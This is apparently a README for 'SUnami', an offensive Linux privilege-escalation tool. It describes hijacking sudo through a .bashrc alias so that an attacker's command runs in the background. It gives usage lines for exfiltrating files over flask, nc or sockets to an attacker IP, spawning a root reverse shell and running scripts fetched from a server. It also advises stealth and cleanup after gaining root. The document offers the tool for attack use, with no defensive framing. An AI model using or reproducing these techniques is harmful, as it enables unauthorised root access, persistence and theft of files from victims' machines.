# SUnami
 Struggling with linux priveledge escelation? well then its time to cheese it with SUnami.  
 0 interaction privesc is always recommended but not always achievable. For this reason we have created a tool for the most trivial priv esc in history (with a few drawbacks).  
 This is not an exploit just a cheap but effective trick. The usecase is when you have a shell on a sudoers account but no sudo cred.  
 It works by manipulating sudo via aliasing in their .bashrc file to prepend a malicious attacker specified command first in the background.  
 This does mean you will need to wait for sudo to be executed.  
 flags denoted with -- are required. with - optional.  
 the -local flag denotes that you want sunami to modify the .bashrc file on the current machine instead of producing output (not suggested for stealth reasons).
 
 # Notice
 using the shells and socket based exfil will throw an error in the targets shell if your listener isn't active. be sure to clean up after gaining root. For the most stealth with file exfil we suggest the built in flask server. Currently our built in listener works best with bash shells. for nc shells using ncs own listener is recommended.  
 SUnami has moved to https://github.com/malectricasoftware/SUnami
 

# File Exfiltration
I used passwd so as not to leak my hash for this demo but rest assured you can read whatever file you wish
![image](https://github.com/witchdocsec/SUnami/assets/107813117/a7f26322-5fca-4030-9725-13dc5a02ac44)  
![image](https://negare.serveo.net)  
## useage:
  sunami.py [-local {1,0}] exfilfile [--file FILE] [--method {postflask,nc,pysocket}] [--ip IP] [--port PORT]
# Root Shell
![image](https://github.com/witchdocsec/SUnami/assets/107813117/06000a59-b7da-45f3-8258-89618aa02a1f)
## useage:
  sunami.py [-local {1,0}] genshell [--ip IP] [--port PORT] [-shell SHELL] [-protocol PROTOCOL] [-listen {1,0}]
# Run From Server
![image](https://github.com/witchdocsec/SUnami/assets/107813117/91127128-64e1-4493-bf85-068bc3a04972)
## useage
  sunami.py [-local {1,0}] rfs [-h] --ip IP --port PORT --file FILE [--vars VARS [VARS ...]] [--schema SCHEMA]
  
